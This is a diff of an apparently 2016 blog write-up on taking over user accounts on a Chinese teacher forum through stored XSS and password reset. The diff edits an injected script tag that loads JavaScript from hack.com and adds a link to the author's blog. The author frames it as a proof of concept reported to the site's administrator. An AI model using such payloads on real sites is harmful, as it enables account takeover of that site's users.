@@ -1,5 +1,5 @@
-title: Compromise Arbitrary Account by Exploiting Stored XSS
-sub_title: Reset User's Password by Injecting XSS
+title: Compromise Arbitrary Account on a Chinese Teacher Forum
+sub_title: Reset User's Password by Exploiting Stored XSS
 date: 2016-08-20
 
 Find and Exploit XSS:
@@ -84,7 +84,7 @@ some length checking.
 Then I uploaded the code onto my server and tried to inject
 
 &lt;script
-src=http://hack.com/hack.js &lt;/script&gt;
+src=http://hack.com/hack.js&gt &lt;/script&gt;
 as input
 
 Since the server escapes quotes, I did not add quotes to the url. I
@@ -144,3 +144,7 @@ probably fix it soon.
 
 My test is only for POC and reporting bugs to administrator, please do
 not use this to do bad stuff.
+
+**Visit**
+[***blogger***](https://rundongliu.blogspot.com/2016/08/reset-users-accounts-by-exploiting.html)
+**to comment.**
